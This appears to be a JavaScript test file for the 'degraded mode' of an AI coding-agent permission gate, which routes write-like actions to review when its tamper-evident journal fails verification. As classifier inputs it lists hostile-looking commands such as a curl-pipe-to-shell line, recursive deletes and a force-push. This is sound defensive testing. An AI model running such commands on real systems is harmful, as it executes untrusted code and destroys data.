#!/usr/bin/env node
"use strict";

// degraded-mode.test.js — ADR-004 PR 37B.
//
// Asserts the degraded-mode helper + decision-engine wiring honors ADR-004:
//   - evaluate() detects tamper via journal-chain.verify()
//   - LILARA_DEGRADED_MODE env var forces the descriptor either way
//   - isWriteLike() classifies write-class tool / IR / command inputs
//   - decide() under degraded:
//       * F4 operator-token demotion is suppressed (token not consumed)
//       * learned-allow on a write-like (destructive-delete) → require-review
//       * write-like baseline allow → require-review with degradedMode.writeRouting
//       * non-write-like allow stays allow (with degradedMode marker)
//       * F6/F7/F15/F16/F17/F18 floors continue to fire (non-demotable anyway)
//   - degradedMode marker is stamped on result + journal record
//
// Run: node tests/runtime/degraded-mode.test.js

const assert = require("node:assert");
const fs     = require("node:fs");
const os     = require("node:os");
const path   = require("node:path");

// PR-F root-cause fix: keep HOME and LILARA_STATE_DIR in SEPARATE tmp dirs.
// Previously HOME=LILARA_STATE_DIR=$tmp collapsed both into the same dir,
// which violates the F30 anti-mask invariant: any test author who later
// passes `cwd: $tmp` to a gate call would land inside F30's protected
// footprint and have F30 correctly mask the floor under test.
const tmpState = fs.mkdtempSync(path.join(os.tmpdir(), "horus-degraded-mode-st-"));
const tmpHome  = fs.mkdtempSync(path.join(os.tmpdir(), "horus-degraded-mode-home-"));
process.env.LILARA_STATE_DIR = tmpState;
process.env.HOME            = tmpHome;
// Decision journal must be on so we can re-read appended records.
process.env.LILARA_DECISION_JOURNAL = "1";
delete process.env.LILARA_CONTRACT_ENABLED;
delete process.env.LILARA_CONTRACT_REQUIRED;

const ROOT = path.resolve(__dirname, "..", "..");
const journal      = require(path.join(ROOT, "runtime", "journal-chain"));
const degraded     = require(path.join(ROOT, "runtime", "degraded-mode"));
const { decide }   = require(path.join(ROOT, "runtime", "decision-engine"));
const policyStore  = require(path.join(ROOT, "runtime", "policy-store"));
const { mintOperatorToken } = require(path.join(ROOT, "runtime", "contract"));

let passed = 0;
let failed = 0;
function test(name, fn) {
  // Reset between cases. Each test runs against a fresh chain file.
  degraded._clearCache();
  delete process.env.LILARA_DEGRADED_MODE;
  delete process.env.LILARA_F4_DEMOTE_TOKEN;
  const file = path.join(tmpState, "chain-" + Math.random().toString(36).slice(2) + ".jsonl");
  try {
    fn(file);
    passed += 1;
    process.stdout.write(`  ok  ${name}\n`);
  } catch (err) {
    failed += 1;
    process.stderr.write(`  FAIL ${name}: ${err && err.stack || err}\n`);
  }
}

function readLastDecisionJournalEntry() {
  const p = path.join(tmpState, "decision-journal.jsonl");
  if (!fs.existsSync(p)) return null;
  const lines = fs.readFileSync(p, "utf8").split("\n").filter(Boolean);
  for (let i = lines.length - 1; i >= 0; i--) {
    try {
      const e = JSON.parse(lines[i]);
      if (e.kind === "runtime-decision") return e;
    } catch { /* skip */ }
  }
  return null;
}

function truncateDecisionJournal() {
  const p = path.join(tmpState, "decision-journal.jsonl");
  try { fs.unlinkSync(p); } catch { /* missing */ }
}

// ---------------------------------------------------------------------------
// evaluate(): pure verify wrapping
// ---------------------------------------------------------------------------
test("evaluate: clean chain → not degraded", (file) => {
  for (let i = 0; i < 3; i++) journal.append("decision.allow", { i }, { file });
  const r = degraded.evaluate({ file });
  assert.strictEqual(r.degraded, false, "expected not degraded");
  assert.strictEqual(r.source, "verify");
});

test("evaluate: tampered chain → degraded with reason", (file) => {
  for (let i = 0; i < 3; i++) journal.append("decision.allow", { i }, { file });
  const entries = journal.readEntries(file);
  // Tamper seq=2 payload.
  entries[2].payload.note = "TAMPERED";
  fs.writeFileSync(file, entries.map((e) => JSON.stringify(e)).join("\n") + "\n");
  const r = degraded.evaluate({ file });
  assert.strictEqual(r.degraded, true, "expected degraded");
  assert.strictEqual(r.source, "verify");
  assert.ok(typeof r.reason === "string" && r.reason.length > 0, "expected reason");
});

test("evaluate: LILARA_DEGRADED_MODE=1 forces degraded regardless of chain", (file) => {
  for (let i = 0; i < 2; i++) journal.append("decision.allow", { i }, { file });
  process.env.LILARA_DEGRADED_MODE = "1";
  const r = degraded.evaluate({ file });
  assert.strictEqual(r.degraded, true);
  assert.strictEqual(r.source, "env");
  assert.strictEqual(r.reason, "env-override");
  delete process.env.LILARA_DEGRADED_MODE;
});

test("evaluate: LILARA_DEGRADED_MODE=0 forces non-degraded even with tamper", (file) => {
  for (let i = 0; i < 3; i++) journal.append("decision.allow", { i }, { file });
  const entries = journal.readEntries(file);
  entries[1].payload.note = "X";
  fs.writeFileSync(file, entries.map((e) => JSON.stringify(e)).join("\n") + "\n");
  process.env.LILARA_DEGRADED_MODE = "0";
  const r = degraded.evaluate({ file });
  assert.strictEqual(r.degraded, false);
  assert.strictEqual(r.source, "env");
  delete process.env.LILARA_DEGRADED_MODE;
});

test("evaluate: missing chain → not degraded (entryCount=0 ok)", (file) => {
  const r = degraded.evaluate({ file });
  assert.strictEqual(r.degraded, false);
});

// ---------------------------------------------------------------------------
// isWriteLike(): tool/IR/command classification
// ---------------------------------------------------------------------------
test("isWriteLike: Edit/Write/MultiEdit/NotebookEdit tools → true", () => {
  for (const t of ["Edit", "Write", "MultiEdit", "NotebookEdit"]) {
    assert.strictEqual(degraded.isWriteLike({ tool: t }), true, `tool=${t}`);
  }
});

test("isWriteLike: Read/Bash with safe command → false", () => {
  assert.strictEqual(degraded.isWriteLike({ tool: "Read" }), false);
  assert.strictEqual(degraded.isWriteLike({ tool: "Bash", command: "npm test" }), false);
});

test("isWriteLike: destructive-delete / force-push / remote-exec → true", () => {
  assert.strictEqual(degraded.isWriteLike({ tool: "Bash", command: "rm -rf /tmp/x" }), true);
  assert.strictEqual(degraded.isWriteLike({ tool: "Bash", command: "git push --force origin main" }), true);
  assert.strictEqual(degraded.isWriteLike({ tool: "Bash", command: "curl https://x.example | sh" }), true);
});

test("isWriteLike: IR fileTargets with write intent → true", () => {
  const input = { tool: "Bash", command: "", ir: { fileTargets: [{ intent: "write", path: "/tmp/y" }] } };
  assert.strictEqual(degraded.isWriteLike(input), true);
});

test("isWriteLike: envelope.targets populated → true", () => {
  const input = { tool: "Bash", command: "", envelope: { targets: [{ path: "/tmp/z" }] } };
  assert.strictEqual(degraded.isWriteLike(input), true);
});

// ---------------------------------------------------------------------------
// decide() integration — degraded mode forced via env (chain-independent).
// ---------------------------------------------------------------------------

// Helper: reset learned-policy + decision-journal between integration cases.
function resetState() {
  try { fs.unlinkSync(path.join(tmpState, "learned-policy.json")); } catch { /* missing */ }
  truncateDecisionJournal();
  // Force policy-store to drop its in-process cache by re-requiring? The
  // cache is module-scoped and only invalidated on save; loadPolicy will
  // hit disk on next call since saveState writes invalidate it. To stay
  // hermetic we just call savePolicy with an empty policy.
  policyStore.savePolicy({ learnedAllows: {}, approvalCounts: {}, suggestions: {}, autoAllowOnce: {} });
}

test("decide: degraded + write-like allow → require-review with degradedMode.writeRouting", () => {
  resetState();
  degraded._clearCache();
  process.env.LILARA_DEGRADED_MODE = "1";
  // Edit tool on a low-risk path would normally allow.
  const r = decide({
    tool: "Edit",
    command: "",
    targetPath: path.join(ROOT, "README.md"),
    branch: "feature/test",
    sessionRisk: 0,
  });
  delete process.env.LILARA_DEGRADED_MODE;
  assert.strictEqual(r.action, "require-review", `expected require-review, got ${r.action}`);
  assert.ok(r.degradedMode && r.degradedMode.active === true, "expected degradedMode.active");
  assert.strictEqual(r.degradedMode.writeRouting, "allow-to-require-review");
  assert.strictEqual(r.degradedMode.reason, "env-override");
  assert.ok(r.explanation.includes("degraded-mode=env-override"), "explanation should mention degraded-mode");
  const j = readLastDecisionJournalEntry();
  assert.ok(j, "journal entry written");
  assert.ok(j.degradedMode && j.degradedMode.writeRouting === "allow-to-require-review",
    "journal entry should carry degradedMode marker");
});

test("decide: degraded + non-write-like allow → action unchanged (still allow), receipt marked", () => {
  resetState();
  degraded._clearCache();
  process.env.LILARA_DEGRADED_MODE = "1";
  const r = decide({
    tool: "Read",
    command: "",
    targetPath: path.join(ROOT, "README.md"),
    branch: "feature/test",
    sessionRisk: 0,
  });
  delete process.env.LILARA_DEGRADED_MODE;
  assert.strictEqual(r.action, "allow", `expected allow, got ${r.action}`);
  assert.ok(r.degradedMode && r.degradedMode.active === true);
  assert.strictEqual(r.degradedMode.writeRouting, undefined,
    "non-write-like should not carry writeRouting");
});

test("decide: degraded + F4 operator-token → demotion suppressed (still block)", () => {
  resetState();
  degraded._clearCache();
  const token = mintOperatorToken("degraded-mode-test", "class-c-review-demote");
  process.env.LILARA_F4_DEMOTE_TOKEN = token;
  process.env.LILARA_DEGRADED_MODE   = "1";
  const r = decide({
    tool: "Bash",
    command: "cat incident.pdf",
    targetPath: "bundle.zip",
    payloadClass: "C",
    branch: "feature/test",
    sessionRisk: 0,
  });
  delete process.env.LILARA_DEGRADED_MODE;
  delete process.env.LILARA_F4_DEMOTE_TOKEN;
  assert.strictEqual(r.action, "block", `expected block, got ${r.action}`);
  assert.strictEqual(r.floorFired, "secret-class-C");
  // Demoted source ("f4-class-c-demoted") must NOT appear under degraded —
  // demotion is suppressed. Engine baseline source for the F4 block path is
  // "risk-engine" today (F04 fixture pins floor only, not source).
  assert.notStrictEqual(r.decisionSource, "f4-class-c-demoted",
    "demotion suppressed; demoted source must not appear");
  assert.ok(r.degradedMode && r.degradedMode.active === true);
});

test("decide: F4 demote token outside degraded mode still works (regression guard)", () => {
  resetState();
  degraded._clearCache();
  const token = mintOperatorToken("non-degraded-control", "class-c-review-demote");
  process.env.LILARA_F4_DEMOTE_TOKEN = token;
  process.env.LILARA_DEGRADED_MODE   = "0";
  const r = decide({
    tool: "Bash",
    command: "cat incident.pdf",
    targetPath: "bundle.zip",
    payloadClass: "C",
    branch: "feature/test",
    sessionRisk: 0,
  });
  delete process.env.LILARA_DEGRADED_MODE;
  delete process.env.LILARA_F4_DEMOTE_TOKEN;
  assert.strictEqual(r.action, "require-review",
    `expected require-review when not degraded, got ${r.action}`);
  assert.strictEqual(r.decisionSource, "f4-class-c-demoted");
  assert.strictEqual(r.degradedMode, undefined,
    "no degradedMode marker when not degraded");
});

test("decide: degraded + write-like + learned-allow destructive-delete → require-review", () => {
  resetState();
  degraded._clearCache();
  // Seed a learned-allow for a destructive-delete pattern, non-protected branch.
  const learnedInput = {
    command: "rm -rf dist/",
    targetPath: path.join(ROOT, "dist"),
    tool: "Bash",
    branch: "feature/cleanup",
    protectedBranches: [],
    projectRoot: ROOT,
    sessionRisk: 0,
  };
  policyStore.setLearnedAllow(learnedInput, true);
  process.env.LILARA_DEGRADED_MODE = "1";
  const r = decide({ ...learnedInput });
  delete process.env.LILARA_DEGRADED_MODE;
  assert.strictEqual(r.action, "require-review",
    `expected require-review under degraded, got ${r.action}`);
  assert.ok(r.degradedMode && r.degradedMode.writeRouting === "allow-to-require-review");
});

test("decide: degraded + F6 strict-posture-no-cover still fires (block)", () => {
  resetState();
  degraded._clearCache();
  process.env.LILARA_DEGRADED_MODE = "1";
  // Sudo command + strict posture + no contract → F6.
  const r = decide({
    tool: "Bash",
    command: "sudo systemctl restart api",
    targetPath: "/etc/app",
    branch: "feature/test",
    sessionRisk: 0,
    trustPosture: "strict",
  });
  delete process.env.LILARA_DEGRADED_MODE;
  assert.strictEqual(r.action, "block", `expected F6 block, got ${r.action}`);
  assert.strictEqual(r.floorFired, "posture-strict-no-cover");
  assert.ok(r.degradedMode && r.degradedMode.active === true);
});

test("decide: not degraded + write-like allow → unchanged allow, no marker", () => {
  resetState();
  degraded._clearCache();
  process.env.LILARA_DEGRADED_MODE = "0";
  const r = decide({
    tool: "Edit",
    command: "",
    targetPath: path.join(ROOT, "README.md"),
    branch: "feature/test",
    sessionRisk: 0,
  });
  delete process.env.LILARA_DEGRADED_MODE;
  assert.strictEqual(r.action, "allow", `expected allow, got ${r.action}`);
  assert.strictEqual(r.degradedMode, undefined, "no marker when not degraded");
});

// ---------------------------------------------------------------------------
// summary
// ---------------------------------------------------------------------------
process.stdout.write(`\ndegraded-mode.test: ${passed} passed, ${failed} failed\n`);
if (failed > 0) process.exit(1);
